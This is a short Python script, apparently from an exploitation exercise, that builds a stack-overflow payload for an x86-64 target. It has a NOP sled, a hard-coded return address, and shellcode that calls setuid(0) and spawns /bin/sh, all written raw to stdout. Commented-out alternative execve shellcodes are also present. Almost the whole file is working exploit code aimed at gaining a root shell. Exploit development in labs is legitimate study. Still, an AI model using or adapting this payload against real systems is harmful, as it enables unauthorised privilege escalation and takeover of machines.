#!/usr/bin/python3

import sys
# import struct

# address = b'\x7f\xff\xff\xff\xe3\xf8'
# address_big = struct.pack(">Q", address)
# address_little = struct.pack("Q", address)


#nop = b'\x90' * 33
nop = b'\x90' * 25
#nop = b'\x90' * 46
addr = b'\xf8\xe3\xff\xff\xff\x7f'
begin = addr[::-1]
# 40
#shellcode = b'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'

# 48 setuid(0)
shellcode = b'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

# 23
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
reverse_shellcode = shellcode[::-1]


payload = begin + nop + shellcode + reverse_shellcode + nop + addr 

# we cannot use print(), print() prints str and is utf-8 encoded. "print('\x90'*200)" is printing 200 U+0090 DEVICE CONTROL STRING characters
# https://stackoverflow.com/questions/75423280/python-is-printing-0x90c2-instead-of-just-0x90-nop
# sys.stdout.buffer is binary buffer
sys.stdout.buffer.write(payload)

